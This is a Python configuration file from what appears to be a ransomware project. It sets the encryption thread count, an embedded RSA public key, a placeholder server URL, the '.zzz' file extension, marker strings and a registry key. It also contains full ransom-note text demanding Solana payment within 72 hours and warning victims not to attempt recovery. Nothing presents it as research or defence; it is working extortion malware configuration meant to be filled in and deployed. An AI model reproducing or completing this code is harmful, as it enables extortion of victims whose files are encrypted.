from stub.types.config import EncryptionConfig, RansomConfig
from hashlib import sha256, md5, sha512
from typing import Final

# Action Control
stub_config: Final[RansomConfig] = RansomConfig()

MAX_ENCRYPT_THREADS: Final[int] = 100
RSA_PUBLIC_KEY: Final[
    str
] = """-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAuubi/LRC61Ipqo1QB1pLZ2KFlyg+DS5Ex/lPt4uWnmySOmohrQwf
38ZsgAHxwKiRPPrtJ9UdcpGZNiFkoaGKDm/vSrWLFPSoIzbEyLRlgHI9r/NrGSIZ
eNxOOg9JiPZIOxMu6ZBiefuEzVIcFil9l5oMbj6dNOOVvROcDncoSde4XTQ5THPf
9WwgASW8eggFHesbHwVytId/r1cqn+4ere0RstjpXgdEvuywCHwJJ2HbCargQeX8
zT4nY99ej/rO/1PgbHjt6kBsOi+FCsz93tqMUSivlGPsQMUJzwmkSmYhmybrWdKl
R8I9w7Ca3LB/SN5y27VGr8UEwl9d+l8m+QIDAQAB
-----END RSA PUBLIC KEY-----
"""
BASE_URL: Final[str] = "https://YOUR_URL_HERE.com/"
ENCRYPTION_CONFIG: Final[EncryptionConfig] = EncryptionConfig(".zzz")
RSA_PUBLIC_KEY_HASH: Final[str] = sha256(RSA_PUBLIC_KEY.encode()).hexdigest()
ATTEMPTING_ENCRYPT_MAGIC: Final[str] = sha512(RSA_PUBLIC_KEY.encode()).hexdigest()
ALREADY_ENCRYPTED_MAGIC: Final[
    str
] = f"DONT_DELETE_ME_{md5(RSA_PUBLIC_KEY_HASH.encode('utf-8')).hexdigest()}"
REGISTRY_KEY: Final[str] = "7702302083"

# The ransom message
RANSOM_DEADLINE: Final[str] = "72"
RANSOM_FILE_NAME: Final[str] = "README.txt"
RANSOM_TITLE: Final[str] = "Woah! Your important files have just been encrypted!"
RANSOM_MESSAGE: Final[
    str
] = f"""
All of your important files have been encrypted with an incredibly strong encryption algorithm. 
For reference, it would take 2.29*10^32 years with a quantum computer to break the encryption.
That is 229 followed by 32 zeros! You will not be able to access them without the decryption key.

To recover your files, you must pay a ransom in cryptocurrency. The details for the payment will be provided below.

Failure to pay within {RANSOM_DEADLINE} hours will result in permanent loss of your files. 
Do not attempt to decrypt the files, change their names, or delete any files, as this may cause irreversible damage.

Follow the instructions carefully to make the payment. Once we confirm the payment, you will receive the decryption key.

Payment Instructions:
1. Go to the following address to make the payment: %s
2. Send %d SOL to the address above.
3. Once the payment is received, we will automatically decrypt your files for you.

Remember, time is running out! Act now to prevent the loss of your important files.
"""
SHORT_RANSOM_MESSAGE: Final[
    str
] = f"""
All of your important files have been encrypted with an incredibly strong encryption algorithm.

You must pay a ransom in cryptocurrency to recover your files.
Failure to pay within {RANSOM_DEADLINE} hours will result in permanent loss of your files.
"""
